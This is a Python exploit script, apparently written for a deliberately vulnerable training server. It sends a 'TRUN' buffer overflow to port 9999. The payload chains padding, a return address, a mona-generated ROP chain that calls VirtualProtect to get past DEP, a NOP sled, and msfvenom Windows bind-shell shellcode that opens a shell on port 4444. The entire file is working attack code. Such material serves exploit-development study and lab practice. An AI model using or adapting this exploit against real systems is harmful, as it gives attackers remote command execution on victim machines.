#! /bin/python3

import socket   # The module "socket" provides access to the BSD socket interface
import struct   # The module "struct" performs conversions between Python values and C structs represented as Python bytes objects.
import sys      # The module "sys" provides access to the runtime environment and allows us to gather information about it.

# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port

# Bind shell
# msfvenom -p windows/shell_bind_tcp RPORT=4444 EXITFUNC=thread -f python -v SHELL -a x86 --platform windows -b '\x00\x0a\x0d'
SHELL =  b""
SHELL += b"\xda\xcb\xbb\x37\xd3\x06\xbe\xd9\x74\x24\xf4\x5a"
SHELL += b"\x2b\xc9\xb1\x53\x31\x5a\x17\x03\x5a\x17\x83\xdd"
SHELL += b"\x2f\xe4\x4b\xdd\x38\x6b\xb3\x1d\xb9\x0c\x3d\xf8"
SHELL += b"\x88\x0c\x59\x89\xbb\xbc\x29\xdf\x37\x36\x7f\xcb"
SHELL += b"\xcc\x3a\xa8\xfc\x65\xf0\x8e\x33\x75\xa9\xf3\x52"
SHELL += b"\xf5\xb0\x27\xb4\xc4\x7a\x3a\xb5\x01\x66\xb7\xe7"
SHELL += b"\xda\xec\x6a\x17\x6e\xb8\xb6\x9c\x3c\x2c\xbf\x41"
SHELL += b"\xf4\x4f\xee\xd4\x8e\x09\x30\xd7\x43\x22\x79\xcf"
SHELL += b"\x80\x0f\x33\x64\x72\xfb\xc2\xac\x4a\x04\x68\x91"
SHELL += b"\x62\xf7\x70\xd6\x45\xe8\x06\x2e\xb6\x95\x10\xf5"
SHELL += b"\xc4\x41\x94\xed\x6f\x01\x0e\xc9\x8e\xc6\xc9\x9a"
SHELL += b"\x9d\xa3\x9e\xc4\x81\x32\x72\x7f\xbd\xbf\x75\xaf"
SHELL += b"\x37\xfb\x51\x6b\x13\x5f\xfb\x2a\xf9\x0e\x04\x2c"
SHELL += b"\xa2\xef\xa0\x27\x4f\xfb\xd8\x6a\x18\xc8\xd0\x94"
SHELL += b"\xd8\x46\x62\xe7\xea\xc9\xd8\x6f\x47\x81\xc6\x68"
SHELL += b"\xa8\xb8\xbf\xe6\x57\x43\xc0\x2f\x9c\x17\x90\x47"
SHELL += b"\x35\x18\x7b\x97\xba\xcd\x16\x9f\x1d\xbe\x04\x62"
SHELL += b"\xdd\x6e\x89\xcc\xb6\x64\x06\x33\xa6\x86\xcc\x5c"
SHELL += b"\x4f\x7b\xef\x73\xcc\xf2\x09\x19\xfc\x52\x81\xb5"
SHELL += b"\x3e\x81\x1a\x22\x40\xe3\x32\xc4\x09\xe5\x85\xeb"
SHELL += b"\x89\x23\xa2\x7b\x02\x20\x76\x9a\x15\x6d\xde\xcb"
SHELL += b"\x82\xfb\x8f\xbe\x33\xfb\x85\x28\xd7\x6e\x42\xa8"
SHELL += b"\x9e\x92\xdd\xff\xf7\x65\x14\x95\xe5\xdc\x8e\x8b"
SHELL += b"\xf7\xb9\xe9\x0f\x2c\x7a\xf7\x8e\xa1\xc6\xd3\x80"
SHELL += b"\x7f\xc6\x5f\xf4\x2f\x91\x09\xa2\x89\x4b\xf8\x1c"
SHELL += b"\x40\x27\x52\xc8\x15\x0b\x65\x8e\x19\x46\x13\x6e"
SHELL += b"\xab\x3f\x62\x91\x04\xa8\x62\xea\x78\x48\x8c\x21"
SHELL += b"\x39\x68\x6f\xe3\x34\x01\x36\x66\xf5\x4c\xc9\x5d"
SHELL += b"\x3a\x69\x4a\x57\xc3\x8e\x52\x12\xc6\xcb\xd4\xcf"
SHELL += b"\xba\x44\xb1\xef\x69\x64\x90"

# !mona rop -m *.dll -n
# C:\Users<User>\AppData\Local\VirtualStore\Program Files (x86)\Immunity Inc\Immunity Debugger

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
        #[---INFO:gadgets_to_set_esi:---]
        0x76e494ee,  # POP EBX # RETN [combase.dll] ** REBASED ** ASLR 
        0x76796164,  # ptr to &VirtualProtect() [IAT ucrtbase.dll] ** REBASED ** ASLR
        0x76333a91,  # MOV ESI,DWORD PTR DS:[EBX] # ADD CL,CL # RETN [OLEAUT32.dll] ** REBASED ** ASLR 
        #[---INFO:gadgets_to_set_ebp:---]
        0x7671d3e6,  # POP EBP # RETN [ucrtbase.dll] ** REBASED ** ASLR 
        0x766e77c5,  # & push esp # ret  [ucrtbase.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_ebx:---]
        0x7654252c,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
        0xfffffdff,  # Value to negate, will become 0x00000201
        0x76e3c8ba,  # NEG EAX # RETN [combase.dll] ** REBASED ** ASLR 
        0x77043349,  # XCHG EAX,EBX # RETN [ntdll.dll] ** REBASED ** ASLR 
        #[---INFO:gadgets_to_set_edx:---]
        0x7704320b,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
        0xffffffc0,  # Value to negate, will become 0x00000040
        0x76da1f0a,  # NEG EAX # RETN [combase.dll] ** REBASED ** ASLR 
        0x76d012db,  # XCHG EAX,EDX # RETN [combase.dll] ** REBASED ** ASLR 
        #[---INFO:gadgets_to_set_ecx:---]
        0x752f4414,  # POP ECX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
        0x62504802,  # &Writable location [Essfun.dll]
        #[---INFO:gadgets_to_set_edi:---]
        0x76d6eda4,  # POP EDI # RETN [combase.dll] ** REBASED ** ASLR 
        0x76f077c7,  # RETN (ROP NOP) [WS2_32.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_eax:---]
        0x76f3e2d0,  # POP EAX # RETN [WS2_32.dll] ** REBASED ** ASLR 
        0x90909090,  # nop
        #[---INFO:pushad:---]
        0x77043201,  # PUSHAD # RETN [ntdll.dll] ** REBASED ** ASLR 
    ]
    return b''.join(struct.pack('<I', _) for _ in rop_gadgets)


PAYLOAD = (
    b'TRUN /.:/' +
    b'A' * 1995 +
    # RETN
    struct.pack('<L', 0x62501039) +
    create_rop_chain() +
    b'\x90' * 32 +
    SHELL +
    b'C' * 990
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
